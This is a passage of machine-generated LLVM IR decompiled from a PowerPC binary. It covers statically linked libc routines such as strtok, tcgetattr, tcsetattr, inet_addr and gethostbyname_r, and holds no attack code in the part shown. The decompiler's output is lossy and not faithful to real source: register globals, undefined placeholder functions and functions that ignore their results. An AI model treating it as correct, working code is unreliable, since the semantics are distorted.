  %v4_1000b870 = icmp eq i32 %v0_1000b8a0, %v0_1000b89c
  %.pre = inttoptr i32 %v0_1000b8a0 to i8*
  br i1 %v4_1000b870, label %dec_label_pc_1000b898, label %dec_label_pc_1000b878

dec_label_pc_1000b878:                            ; preds = %dec_label_pc_1000b870
  %v2_1000b878 = load i8, i8* %.pre, align 1
  %v3_1000b878 = zext i8 %v2_1000b878 to i32
  %v1_1000b87c = inttoptr i32 %v0_1000b89c to i8*
  %v2_1000b87c = load i8, i8* %v1_1000b87c, align 1
  %v3_1000b87c = zext i8 %v2_1000b87c to i32
  %v1_1000b880 = mul nuw nsw i32 %v3_1000b878, 2
  %v1_1000b884 = mul nuw nsw i32 %v3_1000b87c, 2
  %v2_1000b888 = add i32 %v1_1000b880, %v3_1000b868
  %v3_1000b888 = inttoptr i32 %v2_1000b888 to i16*
  %v4_1000b888 = load i16, i16* %v3_1000b888, align 2
  %v5_1000b888 = sext i16 %v4_1000b888 to i32
  %v2_1000b88c = add i32 %v1_1000b884, %v3_1000b868
  %v3_1000b88c = inttoptr i32 %v2_1000b88c to i16*
  %v4_1000b88c = load i16, i16* %v3_1000b88c, align 2
  %v5_1000b88c = sext i16 %v4_1000b88c to i32
  %v2_1000b890 = sub nsw i32 %v5_1000b888, %v5_1000b88c
  %v4_1000b894 = icmp eq i16 %v4_1000b888, %v4_1000b88c
  br i1 %v4_1000b894, label %dec_label_pc_1000b898, label %dec_label_pc_1000b8ac

dec_label_pc_1000b898:                            ; preds = %dec_label_pc_1000b870, %dec_label_pc_1000b878
  %v0_1000b8ac7 = phi i32 [ %v2_1000b890, %dec_label_pc_1000b878 ], [ %v0_1000b8ac6, %dec_label_pc_1000b870 ]
  %v2_1000b898 = load i8, i8* %.pre, align 1
  %v1_1000b89c = add i32 %v0_1000b89c, 1
  %v1_1000b8a0 = add i32 %v0_1000b8a0, 1
  %v3_1000b8a4 = icmp eq i8 %v2_1000b898, 0
  br i1 %v3_1000b8a4, label %dec_label_pc_1000b8ac, label %dec_label_pc_1000b870

dec_label_pc_1000b8ac:                            ; preds = %dec_label_pc_1000b898, %dec_label_pc_1000b878
  %v0_1000b8ac = phi i32 [ %v0_1000b8ac7, %dec_label_pc_1000b898 ], [ %v2_1000b890, %dec_label_pc_1000b878 ]
  ret i32 %v0_1000b8ac

; uselistorder directives
  uselistorder i32 %v2_1000b890, { 1, 0 }
  uselistorder i32 %v0_1000b8a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b898, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1002c388.314 to i32), i32* @r5, align 4
  %v1_1000b8bc = call i32 @strtok_r(i32 ptrtoint (i32* @global_var_1002c388.314 to i32))
  ret i32 %v1_1000b8bc
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-72 = alloca i32, align 4
  store i32 268482772, i32* @lr, align 4
  %v2_1000b8d0 = call i32 @__GI_tcgetattr(i32* nonnull %stack_var_-72)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32*)* @__GI_tcgetattr, { 1, 0 }
}

define i32 @__libc_tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000b8fc = call i32 @ioctl(i32 536900637, i32 1, i32 1)
  ret i32 %v3_1000b8fc
}

define i32 @__GI_tcgetattr(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_2()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000b904 = load i32, i32* @lr, align 4
  store i32 %v0_1000b904, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000b914 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268482856, i32* @lr, align 4
  %v3_1000b924 = call i32 @ioctl(i32 1076655123, i32 %v2_1000b914, i32 %v2_1000b914)
  %v2_1000b928 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000b928, i32* @r4, align 4
  store i32 %v3_1000b924, i32* @r30, align 4
  %v3_1000b92c = icmp eq i32 %v3_1000b924, 0
  store i32 19, i32* @r5, align 4
  %v0_1000b934 = load i32, i32* @r31, align 4
  br i1 %v3_1000b92c, label %dec_label_pc_1000b93c, label %dec_label_pc_1000b984

dec_label_pc_1000b93c:                            ; preds = %entry
  %v1_1000b934 = add i32 %v0_1000b934, 17
  %v4_1000b948 = zext i8 %tmp4 to i32
  store i32 %v4_1000b948, i32* @r8, align 4
  store i32 %tmp3, i32* @r7, align 4
  %v3_1000b954 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1000b954, i32* %r0.global-to-local, align 4
  %v2_1000b958 = add i32 %v0_1000b934, 4
  %v3_1000b958 = inttoptr i32 %v2_1000b958 to i32*
  store i32 %tmp7, i32* %v3_1000b958, align 4
  %v0_1000b95c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b95c = load i32, i32* @r31, align 4
  %v2_1000b95c = inttoptr i32 %v1_1000b95c to i32*
  store i32 %v0_1000b95c, i32* %v2_1000b95c, align 4
  %v0_1000b960 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b960 = load i32, i32* @r31, align 4
  %v2_1000b960 = add i32 %v1_1000b960, 8
  %v3_1000b960 = inttoptr i32 %v2_1000b960 to i32*
  store i32 %v0_1000b960, i32* %v3_1000b960, align 4
  %v0_1000b964 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000b964 = load i32, i32* @r31, align 4
  %v2_1000b964 = add i32 %v1_1000b964, 12
  %v3_1000b964 = inttoptr i32 %v2_1000b964 to i32*
  store i32 %v0_1000b964, i32* %v3_1000b964, align 4
  %v3_1000b968 = load i32, i32* @r31, align 4
  %v4_1000b968 = add i32 %v3_1000b968, 16
  %v5_1000b968 = inttoptr i32 %v4_1000b968 to i8*
  store i8 %tmp4, i8* %v5_1000b968, align 1
  %v1_1000b96c = load i32, i32* @r31, align 4
  %v2_1000b96c = add i32 %v1_1000b96c, 52
  %v3_1000b96c = inttoptr i32 %v2_1000b96c to i32*
  store i32 %tmp3, i32* %v3_1000b96c, align 4
  %v1_1000b970 = load i32, i32* @r31, align 4
  %v2_1000b970 = add i32 %v1_1000b970, 56
  %v3_1000b970 = inttoptr i32 %v2_1000b970 to i32*
  store i32 %tmp2, i32* %v3_1000b970, align 4
  store i32 268482936, i32* @lr, align 4
  %v6_1000b974 = sext i8 %tmp4 to i32
  %v8_1000b974 = call i32 @__GI_mempcpy(i32 %v1_1000b934, i32 %v2_1000b928, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_1000b974, i32 %tmp7)
  store i32 268482948, i32* @lr, align 4
  %v3_1000b980 = call i32 @__GI_memset(i32 %v8_1000b974, i32 0, i32 13)
  %v0_1000b988.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000b984

dec_label_pc_1000b984:                            ; preds = %entry, %dec_label_pc_1000b93c
  %v0_1000b988 = phi i32 [ %v3_1000b924, %entry ], [ %v0_1000b988.pre, %dec_label_pc_1000b93c ]
  store i32 %v0_1000b904, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000b988

; uselistorder directives
  uselistorder i32 %v2_1000b914, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i8 %tmp4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000b984, { 1, 0 }
}

define i32 @__GI_tcsetattr() local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000b99c = load i32, i32* @r4, align 4
  %v3_1000b99c = icmp eq i32 %v0_1000b99c, 1
  %v0_1000b9ac = load i32, i32* @r3, align 4
  store i32 %v0_1000b9ac, i32* @r27, align 4
  %v0_1000b9b4 = load i32, i32* @r5, align 4
  store i32 %v0_1000b9b4, i32* @r31, align 4
  br i1 %v3_1000b99c, label %dec_label_pc_1000b9d8, label %dec_label_pc_1000b9bc

dec_label_pc_1000b9bc:                            ; preds = %entry
  %v3_1000b9bc = icmp eq i32 %v0_1000b99c, 2
  br i1 %v3_1000b9bc, label %dec_label_pc_1000b9f8, label %dec_label_pc_1000b9c4

dec_label_pc_1000b9c4:                            ; preds = %dec_label_pc_1000b9bc
  %v3_1000b9c4 = icmp eq i32 %v0_1000b99c, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_1000b9c4, label %dec_label_pc_1000ba00, label %dec_label_pc_1000b9e4

dec_label_pc_1000b9d8:                            ; preds = %entry
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_1000ba00

dec_label_pc_1000b9e4:                            ; preds = %dec_label_pc_1000b9c4
  %v0_1000b9e4 = call i32 @__errno_location()
  store i32 -1, i32* @r28, align 4
  %v2_1000b9f0 = inttoptr i32 %v0_1000b9e4 to i32*
  store i32 22, i32* %v2_1000b9f0, align 4
  br label %dec_label_pc_1000bae8

dec_label_pc_1000b9f8:                            ; preds = %dec_label_pc_1000b9bc
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_1000ba00

dec_label_pc_1000ba00:                            ; preds = %dec_label_pc_1000b9c4, %dec_label_pc_1000b9d8, %dec_label_pc_1000b9f8
  %v1_1000ba00 = inttoptr i32 %v0_1000b9b4 to i32*
  %v2_1000ba00 = load i32, i32* %v1_1000ba00, align 4
  store i32 19, i32* @r5, align 4
  %v1_1000ba08 = add i32 %v0_1000b9b4, 4
  %v2_1000ba08 = inttoptr i32 %v1_1000ba08 to i32*
  %v3_1000ba08 = load i32, i32* %v2_1000ba08, align 4
  store i32 %v3_1000ba08, i32* %r9.global-to-local, align 4
  %v1_1000ba0c = add i32 %v0_1000b9b4, 17
  store i32 %v1_1000ba0c, i32* @r4, align 4
  %v1_1000ba10 = add i32 %v0_1000b9b4, 8
  %v2_1000ba10 = inttoptr i32 %v1_1000ba10 to i32*
  %v3_1000ba10 = load i32, i32* %v2_1000ba10, align 4
  %v2_1000ba14 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000ba14, i32* @r3, align 4
  %v2_1000ba1c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1000ba1c, i32* @r26, align 4
  %v1_1000ba20 = add i32 %v0_1000b9b4, 16
  %v2_1000ba20 = inttoptr i32 %v1_1000ba20 to i8*
  %v3_1000ba20 = load i8, i8* %v2_1000ba20, align 1
  %v4_1000ba20 = zext i8 %v3_1000ba20 to i32
  store i32 %v4_1000ba20, i32* @r8, align 4
  %v1_1000ba24 = add i32 %v0_1000b9b4, 52
  %v2_1000ba24 = inttoptr i32 %v1_1000ba24 to i32*
  %v3_1000ba24 = load i32, i32* %v2_1000ba24, align 4
  store i32 %v3_1000ba24, i32* @r7, align 4
  store i32 %v2_1000ba00, i32* %stack_var_-72, align 4
  store i32 268483148, i32* @lr, align 4
  %v0_1000ba48 = call i32 @memcpy()
  %v0_1000ba4c = load i32, i32* @r27, align 4
  %v0_1000ba50 = load i32, i32* @r30, align 4
  store i32 268483168, i32* @lr, align 4
  %v3_1000ba5c = call i32 @ioctl(i32 %v0_1000ba4c, i32 %v0_1000ba50, i32 %v2_1000ba1c)
  store i32 %v3_1000ba5c, i32* @r28, align 4
  %v3_1000ba60 = icmp eq i32 %v3_1000ba5c, 0
  br i1 %v3_1000ba60, label %dec_label_pc_1000ba68, label %dec_label_pc_1000bae8

dec_label_pc_1000ba68:                            ; preds = %dec_label_pc_1000ba00
  %v0_1000ba68 = load i32, i32* @r30, align 4
  %v3_1000ba6c = icmp eq i32 %v0_1000ba68, -2144570348
  br i1 %v3_1000ba6c, label %dec_label_pc_1000ba74, label %dec_label_pc_1000bae4

dec_label_pc_1000ba74:                            ; preds = %dec_label_pc_1000ba68
  %v0_1000ba74 = call i32 @__errno_location()
  store i32 %v0_1000ba74, i32* @r29, align 4
  %v0_1000ba84 = load i32, i32* @r27, align 4
  %v1_1000ba8c = inttoptr i32 %v0_1000ba74 to i32*
  %v2_1000ba8c = load i32, i32* %v1_1000ba8c, align 4
  store i32 %v2_1000ba8c, i32* @r30, align 4
  store i32 268483224, i32* @lr, align 4
  %v3_1000ba94 = call i32 @ioctl(i32 %v0_1000ba84, i32 1076655123, i32 %v2_1000ba1c)
  %v3_1000ba98 = icmp eq i32 %v3_1000ba94, 0
  br i1 %v3_1000ba98, label %dec_label_pc_1000baa8, label %dec_label_pc_1000baa0

dec_label_pc_1000baa0:                            ; preds = %dec_label_pc_1000ba74
  %v0_1000baa0 = load i32, i32* @r30, align 4
  %v1_1000baa0 = load i32, i32* @r29, align 4
  %v2_1000baa0 = inttoptr i32 %v1_1000baa0 to i32*
  store i32 %v0_1000baa0, i32* %v2_1000baa0, align 4
  br label %dec_label_pc_1000bae8

dec_label_pc_1000baa8:                            ; preds = %dec_label_pc_1000ba74
  %v0_1000baa8 = load i32, i32* @r31, align 4
  %v1_1000baa8 = add i32 %v0_1000baa8, 8
  %v2_1000baa8 = inttoptr i32 %v1_1000baa8 to i32*
  %v3_1000baa8 = load i32, i32* %v2_1000baa8, align 4
  %v1_1000bab0 = call i32 @__asm_rlwinm(i32 %v3_1000baa8, i32 0, i32 19, i32 20)
  %v1_1000bab4 = call i32 @__asm_rlwinm(i32 %v3_1000ba10, i32 0, i32 19, i32 20)
  store i32 %v1_1000bab4, i32* %r9.global-to-local, align 4
  %v4_1000bab8 = icmp eq i32 %v1_1000bab0, %v1_1000bab4
  br i1 %v4_1000bab8, label %dec_label_pc_1000bac0, label %dec_label_pc_1000bad4

dec_label_pc_1000bac0:                            ; preds = %dec_label_pc_1000baa8
  %v1_1000bac0 = and i32 %v3_1000baa8, 768
  store i32 %v1_1000bac0, i32* %r9.global-to-local, align 4
  %v3_1000bac0 = icmp eq i32 %v1_1000bac0, 0
  br i1 %v3_1000bac0, label %dec_label_pc_1000bae4, label %dec_label_pc_1000bac8

dec_label_pc_1000bac8:                            ; preds = %dec_label_pc_1000bac0
  %v1_1000bac8 = call i32 @__asm_rlwinm(i32 %v3_1000ba10, i32 0, i32 22, i32 23)
  %v0_1000bacc = load i32, i32* %r9.global-to-local, align 4
  %v4_1000bacc = icmp eq i32 %v0_1000bacc, %v1_1000bac8
  br i1 %v4_1000bacc, label %dec_label_pc_1000bae4, label %dec_label_pc_1000bad4

dec_label_pc_1000bad4:                            ; preds = %dec_label_pc_1000baa8, %dec_label_pc_1000bac8
  store i32 -1, i32* @r28, align 4
  %v1_1000badc = load i32, i32* @r29, align 4
  %v2_1000badc = inttoptr i32 %v1_1000badc to i32*
  store i32 22, i32* %v2_1000badc, align 4
  br label %dec_label_pc_1000bae8

dec_label_pc_1000bae4:                            ; preds = %dec_label_pc_1000ba68, %dec_label_pc_1000bac8, %dec_label_pc_1000bac0
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000bae8

dec_label_pc_1000bae8:                            ; preds = %dec_label_pc_1000ba00, %dec_label_pc_1000bad4, %dec_label_pc_1000b9e4, %dec_label_pc_1000baa0, %dec_label_pc_1000bae4
  %v0_1000baec = load i32, i32* @r28, align 4
  ret i32 %v0_1000baec

; uselistorder directives
  uselistorder i32 %v0_1000b9b4, { 1, 0, 3, 2, 5, 4, 6 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1000bae8, { 4, 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_1000bae4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000bad4, { 1, 0 }
  uselistorder label %dec_label_pc_1000ba00, { 2, 1, 0 }
}

define i32 @ntohl() local_unnamed_addr {
entry:
  %v0_1000bb00 = load i32, i32* @r3, align 4
  ret i32 %v0_1000bb00
}

define i32 @ntohs() local_unnamed_addr {
entry:
  %v0_1000bb04 = load i32, i32* @r3, align 4
  ret i32 %v0_1000bb04
}

define i32 @htonl() local_unnamed_addr {
entry:
  %v0_1000bb08 = load i32, i32* @r3, align 4
  ret i32 %v0_1000bb08
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000bb0c = load i32, i32* @r3, align 4
  ret i32 %v0_1000bb0c
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000bb18 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000bb18, i32* @r4, align 4
  store i32 268483364, i32* @lr, align 4
  %v1_1000bb20 = bitcast i32* %stack_var_-24 to i8*
  %v2_1000bb20 = call i32 @inet_aton(i8* %v1_1000bb20)
  %v3_1000bb24 = icmp eq i32 %v2_1000bb20, 0
  br i1 %v3_1000bb24, label %dec_label_pc_1000bb34, label %dec_label_pc_1000bb30

dec_label_pc_1000bb30:                            ; preds = %entry
  %v3_1000bb30 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000bb34

dec_label_pc_1000bb34:                            ; preds = %entry, %dec_label_pc_1000bb30
  %v0_1000bb40 = phi i32 [ -1, %entry ], [ %v3_1000bb30, %dec_label_pc_1000bb30 ]
  ret i32 %v0_1000bb40

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000bb34, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1000bb58 = call i32 @__GI___h_errno_location()
  %v2_1000bb68 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268483456, i32* @lr, align 4
  %v7_1000bb7c = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_10030b38.315, i32 ptrtoint (i32* @global_var_1003096c.316 to i32), i32 460, i32 %v2_1000bb68, i32 %v0_1000bb58)
  %v3_1000bb84 = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_1000bb84
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg6, i32* @r8, align 4
  store i32 %arg5, i32* @r7, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v0_1000bb9c = load i32, i32* @lr, align 4
  store i32 %v0_1000bb9c, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r23, align 4
  %v3_1000bba4 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r31, align 4
  store i32 %arg5, i32* @r20, align 4
  store i32 %tmp, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg4, i32* @r29, align 4
  store i32 %arg6, i32* @r24, align 4
  %v2_1000bbc4 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_1000bbc4, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  br i1 %v3_1000bba4, label %dec_label_pc_1000bec8, label %dec_label_pc_1000bbd0

dec_label_pc_1000bbd0:                            ; preds = %entry
  %v0_1000bbd0 = call i32 @__errno_location()
  store i32 %v0_1000bbd0, i32* %r3.global-to-local, align 4
  %v1_1000bbd8 = inttoptr i32 %v0_1000bbd0 to i32*
  %v2_1000bbd8 = load i32, i32* %v1_1000bbd8, align 4
  store i32 %v2_1000bbd8, i32* @r27, align 4
  store i32 %v0_1000bbd0, i32* %r28.global-to-local, align 4
  %v0_1000bbe0 = load i32, i32* @r31, align 4
  store i32 %v0_1000bbe0, i32* %v1_1000bbd8, align 4
  %v0_1000bbe4 = load i32, i32* %r26.global-to-local, align 4
  %v0_1000bbe8 = load i32, i32* @r23, align 4
  store i32 %v0_1000bbe8, i32* %r3.global-to-local, align 4
  %v0_1000bbec = load i32, i32* @r30, align 4
  %v0_1000bbf0 = load i32, i32* @r29, align 4
  %v0_1000bbf4 = load i32, i32* @r20, align 4
  %v0_1000bbf8 = load i32, i32* @r24, align 4
  store i32 268483584, i32* @lr, align 4
  %v7_1000bbfc = call i32 @__get_hosts_byname_r(i32 %v0_1000bbe8, i32 2, i32 %v0_1000bbe4, i32 %v0_1000bbec, i32 %v0_1000bbf0, i32 %v0_1000bbf4, i32 %v0_1000bbf8)
  store i32 %v7_1000bbfc, i32* %r3.global-to-local, align 4
  %v3_1000bc00 = icmp eq i32 %v7_1000bbfc, 0
  br i1 %v3_1000bc00, label %dec_label_pc_1000bec8, label %dec_label_pc_1000bc08

dec_label_pc_1000bc08:                            ; preds = %dec_label_pc_1000bbd0
  %v0_1000bc08 = load i32, i32* @r24, align 4
  %v1_1000bc08 = inttoptr i32 %v0_1000bc08 to i32*
  %v2_1000bc08 = load i32, i32* %v1_1000bc08, align 4
  store i32 %v2_1000bc08, i32* %r0.global-to-local, align 4
  %v3_1000bc0c = icmp eq i32 %v2_1000bc08, 1
  br i1 %v3_1000bc0c, label %dec_label_pc_1000bc30, label %dec_label_pc_1000bc14

dec_label_pc_1000bc14:                            ; preds = %dec_label_pc_1000bc08
  %v3_1000bc14 = icmp eq i32 %v2_1000bc08, 4
  br i1 %v3_1000bc14, label %dec_label_pc_1000bc30, label %dec_label_pc_1000bc1c

dec_label_pc_1000bc1c:                            ; preds = %dec_label_pc_1000bc14
  %v3_1000bc1c = icmp eq i32 %v2_1000bc08, -1
  br i1 %v3_1000bc1c, label %dec_label_pc_1000bc24, label %dec_label_pc_1000bec8

dec_label_pc_1000bc24:                            ; preds = %dec_label_pc_1000bc1c
  %v0_1000bc24 = load i32, i32* @r28, align 4
  %v1_1000bc24 = inttoptr i32 %v0_1000bc24 to i32*
  %v2_1000bc24 = load i32, i32* %v1_1000bc24, align 4
  store i32 %v2_1000bc24, i32* %r0.global-to-local, align 4
  %v3_1000bc28 = icmp eq i32 %v2_1000bc24, 2
  br i1 %v3_1000bc28, label %dec_label_pc_1000bc30, label %dec_label_pc_1000bec8

dec_label_pc_1000bc30:                            ; preds = %dec_label_pc_1000bc24, %dec_label_pc_1000bc14, %dec_label_pc_1000bc08
  %v0_1000bc30 = load i32, i32* @r30, align 4
  %v1_1000bc30 = sub i32 0, %v0_1000bc30
  store i32 %v1_1000bc30, i32* %r0.global-to-local, align 4
  %v0_1000bc34 = load i32, i32* @r27, align 4
  %v1_1000bc34 = load i32, i32* @r28, align 4
  %v2_1000bc34 = inttoptr i32 %v1_1000bc34 to i32*
  store i32 %v0_1000bc34, i32* %v2_1000bc34, align 4
  %v0_1000bc38 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000bc38 = urem i32 %v0_1000bc38, 4
  store i32 %v1_1000bc38, i32* %r0.global-to-local, align 4
  %v3_1000bc38 = icmp eq i32 %v1_1000bc38, 0
  %v0_1000bc50.pre = load i32, i32* @r29, align 4
  br i1 %v3_1000bc38, label %dec_label_pc_1000bc50, label %dec_label_pc_1000bc40

dec_label_pc_1000bc40:                            ; preds = %dec_label_pc_1000bc30
  %v2_1000bc40 = icmp ult i32 %v0_1000bc50.pre, %v1_1000bc38
  br i1 %v2_1000bc40, label %dec_label_pc_1000bec4, label %dec_label_pc_1000bc48

dec_label_pc_1000bc48:                            ; preds = %dec_label_pc_1000bc40
  %v2_1000bc48 = sub i32 %v0_1000bc50.pre, %v1_1000bc38
  store i32 %v2_1000bc48, i32* @r29, align 4
  %v0_1000bc4c = load i32, i32* @r30, align 4
  %v2_1000bc4c = add i32 %v0_1000bc4c, %v1_1000bc38
  store i32 %v2_1000bc4c, i32* @r30, align 4
  br label %dec_label_pc_1000bc50

dec_label_pc_1000bc50:                            ; preds = %dec_label_pc_1000bc30, %dec_label_pc_1000bc48
  %v0_1000bc50 = phi i32 [ %v2_1000bc48, %dec_label_pc_1000bc48 ], [ %v0_1000bc50.pre, %dec_label_pc_1000bc30 ]
  store i32 -1, i32* @r19, align 4
  %v1_1000bc58 = load i32, i32* @r24, align 4
  %v2_1000bc58 = inttoptr i32 %v1_1000bc58 to i32*
  store i32 -1, i32* %v2_1000bc58, align 4
  %tmp29 = icmp ult i32 %v0_1000bc50, 4
  br i1 %tmp29, label %dec_label_pc_1000bec4, label %dec_label_pc_1000bc60

dec_label_pc_1000bc60:                            ; preds = %dec_label_pc_1000bc50
  %v0_1000bc60 = load i32, i32* @r29, align 4
  %v1_1000bc60 = add i32 %v0_1000bc60, -4
  store i32 %v1_1000bc60, i32* %r0.global-to-local, align 4
  %tmp30 = icmp ult i32 %v1_1000bc60, 8
  br i1 %tmp30, label %dec_label_pc_1000bec4, label %dec_label_pc_1000bc6c

dec_label_pc_1000bc6c:                            ; preds = %dec_label_pc_1000bc60
  %v1_1000bc6c = add i32 %v0_1000bc60, -12
  store i32 %v1_1000bc6c, i32* %r0.global-to-local, align 4
  %v0_1000bc70 = load i32, i32* @r30, align 4
  %v1_1000bc70 = add i32 %v0_1000bc70, 4
  store i32 %v1_1000bc70, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  %v3_1000bc7c = inttoptr i32 %v1_1000bc70 to i32*
  store i32 %v0_1000bc70, i32* %v3_1000bc7c, align 4
  %v0_1000bc80 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000bc80 = load i32, i32* %r25.global-to-local, align 4
  %v2_1000bc80 = add i32 %v1_1000bc80, 4
  %v3_1000bc80 = inttoptr i32 %v2_1000bc80 to i32*
  store i32 %v0_1000bc80, i32* %v3_1000bc80, align 4
  %tmp31 = icmp ult i32 %v1_1000bc6c, 32
  br i1 %tmp31, label %dec_label_pc_1000bec4, label %dec_label_pc_1000bc88

dec_label_pc_1000bc88:                            ; preds = %dec_label_pc_1000bc6c
  %v0_1000bc88 = load i32, i32* @r29, align 4
  %v1_1000bc88 = add i32 %v0_1000bc88, -44
  %tmp32 = icmp ult i32 %v1_1000bc88, 256
  br i1 %tmp32, label %dec_label_pc_1000bec4, label %dec_label_pc_1000bc94

dec_label_pc_1000bc94:                            ; preds = %dec_label_pc_1000bc88
  %v0_1000bc94 = load i32, i32* @r30, align 4
  %v1_1000bc94 = add i32 %v0_1000bc94, 44
  store i32 %v1_1000bc94, i32* @r31, align 4
  %v0_1000bc98 = load i32, i32* @r23, align 4
  store i32 %v0_1000bc98, i32* @r4, align 4
  %v1_1000bca0 = add i32 %v0_1000bc94, 12
  store i32 %v1_1000bca0, i32* @r21, align 4
  store i32 %v1_1000bc94, i32* %r3.global-to-local, align 4
  store i32 268483756, i32* @lr, align 4
  %v3_1000bca8 = call i32 @strncpy(i32 %v1_1000bc94, i32 %v0_1000bc98, i32 %v1_1000bc88)
  %v0_1000bcac = load i32, i32* @r31, align 4
  %v1_1000bcac = load i32, i32* @r30, align 4
  %v2_1000bcac = add i32 %v1_1000bcac, 12
  %v3_1000bcac = inttoptr i32 %v2_1000bcac to i32*
  store i32 %v0_1000bcac, i32* %v3_1000bcac, align 4
  %v0_1000bcb0 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000bcb0 = load i32, i32* @r21, align 4
  %v2_1000bcb0 = add i32 %v1_1000bcb0, 4
  %v3_1000bcb0 = inttoptr i32 %v2_1000bcb0 to i32*
  store i32 %v0_1000bcb0, i32* %v3_1000bcb0, align 4
  %v0_1000bcb4 = load i32, i32* @r23, align 4
  store i32 %v0_1000bcb4, i32* %r3.global-to-local, align 4
  %v0_1000bcb8 = load i32, i32* @r30, align 4
  store i32 %v0_1000bcb8, i32* @r4, align 4
  store i32 268483776, i32* @lr, align 4
  %v2_1000bcbc = inttoptr i32 %v0_1000bcb4 to i8*
  %v3_1000bcbc = call i32 @inet_aton(i8* %v2_1000bcbc)
  store i32 %v3_1000bcbc, i32* %r3.global-to-local, align 4
  store i32 %v3_1000bcbc, i32* @r22, align 4
  %v3_1000bcc0 = icmp eq i32 %v3_1000bcbc, 0
  br i1 %v3_1000bcc0, label %dec_label_pc_1000bcf4, label %dec_label_pc_1000bcc8

dec_label_pc_1000bcc8:                            ; preds = %dec_label_pc_1000bc94
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000bcd0 = load i32, i32* @r26, align 4
  %v2_1000bcd0 = add i32 %v1_1000bcd0, 8
  %v3_1000bcd0 = inttoptr i32 %v2_1000bcd0 to i32*
  store i32 2, i32* %v3_1000bcd0, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1000bcd8 = load i32, i32* @r31, align 4
  %v1_1000bcd8 = load i32, i32* @r26, align 4
  %v2_1000bcd8 = inttoptr i32 %v1_1000bcd8 to i32*
  store i32 %v0_1000bcd8, i32* %v2_1000bcd8, align 4
  %v0_1000bcdc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000bcdc = load i32, i32* @r26, align 4
  %v2_1000bcdc = add i32 %v1_1000bcdc, 12
  %v3_1000bcdc = inttoptr i32 %v2_1000bcdc to i32*
  store i32 %v0_1000bcdc, i32* %v3_1000bcdc, align 4
